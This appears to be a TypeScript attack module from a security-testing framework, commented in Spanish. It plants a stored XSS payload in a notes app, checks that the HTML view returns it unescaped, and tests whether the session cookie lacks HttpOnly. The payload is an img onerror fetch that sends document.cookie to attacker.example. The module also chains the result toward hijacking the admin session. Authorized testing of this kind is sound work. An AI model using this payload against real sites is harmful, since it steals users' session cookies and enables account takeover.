/**
 * Ataque real: stored XSS. El cuerpo de la nota se renderiza con <%- %> (sin
 * escapar) en note.ejs y admin.ejs. Guardamos una nota con payload y verificamos
 * que la vista HTML lo devuelve SIN escapar. Además, chequeamos que la cookie de
 * sesión no es httpOnly. La nota creada se limpia por el teardown (tracker).
 */
import { CATALOG } from '../catalog.ts';
import { reqLine } from '../http.ts';
import { hex } from '../rng.ts';
import { lowPrivSession } from './session.ts';
import type { Attack, AttackContext, AttackResult, AttackStep } from '../types.ts';

export const storedXss: Attack = {
  meta: CATALOG['stored-xss'],
  mutating: true, // crea una nota con payload (se borra en el teardown)
  async run(ctx: AttackContext): Promise<AttackResult> {
    const steps: AttackStep[] = [];
    const sess = await lowPrivSession(ctx);
    const token = sess.token;

    const marker = `xss-${hex(ctx.rng, 8)}`;
    const payload = `<img src=x onerror="fetch('https://attacker.example/'+document.cookie)//${marker}">`;

    // 1. Guardar la nota maliciosa y registrar su limpieza.
    const create = await ctx.http.post('/api/notes', { title: 'nota', body: payload }, { token });
    const noteId = (create.json as { id?: number })?.id;
    if (noteId) {
      ctx.tracker.add(`nota XSS #${noteId}`, async () => {
        await ctx.http.del(`/api/notes/${noteId}`, { token });
      });
    }
    steps.push({
      technique: 'Inyección de payload almacenado',
      mitre: ['T1059.007'],
      request: reqLine('POST', '/api/notes'),
      response_summary: `HTTP ${create.status} — nota #${noteId} con payload <img onerror>`,
      exchange: create.exchange,
    });

    // 2. ¿La vista HTML lo devuelve sin escapar?
    let unescaped = false;
    if (noteId) {
      const view = await ctx.http.get(`/notes/${noteId}`, { cookie: `token=${token}`, headers: { accept: 'text/html' } });
      unescaped = view.text.includes(marker) && (view.text.includes('onerror=') || view.text.includes('<img'));
      const escaped = view.text.includes('&lt;img');
      steps.push({
        technique: 'Render de la nota en la vista HTML',
        request: reqLine('GET', `/notes/${noteId}`),
        response_summary: unescaped
          ? 'el payload se devuelve SIN escapar (<img onerror> ejecutable)'
          : escaped
            ? 'el payload aparece escapado (&lt;img): no explotable'
            : 'el payload no apareció en la vista',
        exchange: view.exchange,
        note: unescaped ? 'En /admin esta misma nota se ejecuta en el navegador de la admin (Catalina).' : undefined,
      });
    }

    // 3. ¿La cookie de sesión es robable por el XSS? (falta httpOnly)
    //    Requiere credencial conocida para el login web de formulario.
    let cookieNotHttpOnly = false;
    if (ctx.target.weak_login) {
      const webLogin = await ctx.http.request({
        method: 'POST',
        path: '/login',
        headers: { 'content-type': 'application/x-www-form-urlencoded', accept: 'text/html' },
        body: `email=${encodeURIComponent(ctx.target.weak_login.email)}&password=${encodeURIComponent(ctx.target.weak_login.password)}`,
        noRedirect: true,
      });
      const setCookie = webLogin.headers['set-cookie'] ?? '';
      cookieNotHttpOnly = /token=/.test(setCookie) && !/httponly/i.test(setCookie);
      steps.push({
        technique: 'Revisión de la cookie de sesión',
        mitre: ['T1539'],
        request: reqLine('POST', '/login'),
        response_summary: cookieNotHttpOnly
          ? 'Set-Cookie token sin HttpOnly: un XSS puede leer document.cookie'
          : 'cookie protegida o no observable',
        exchange: webLogin.exchange,
      });
    }

    const confirmed = unescaped;
    return {
      vuln_id: storedXss.meta.id,
      confirmed,
      blocked: !confirmed,
      steps,
      gained: confirmed
        ? ['ejecución de JS en el navegador de otros usuarios (incl. admin)', ...(cookieNotHttpOnly ? ['robo de cookie de sesión (sin httpOnly)'] : [])]
        : [],
      foothold: confirmed ? { type: 'jwt', detail: 'robo de sesión de la admin vía XSS → encadena con jwt-not-invalidated' } : undefined,
      attacker_active: false,
      summary: confirmed
        ? `Stored XSS confirmado: el cuerpo de la nota se renderiza sin escapar${cookieNotHttpOnly ? ' y la cookie no es httpOnly, así que el token de la admin es robable' : ''}.`
        : 'La vista escapó el contenido: no se confirmó XSS almacenado.',
    };
  },
};
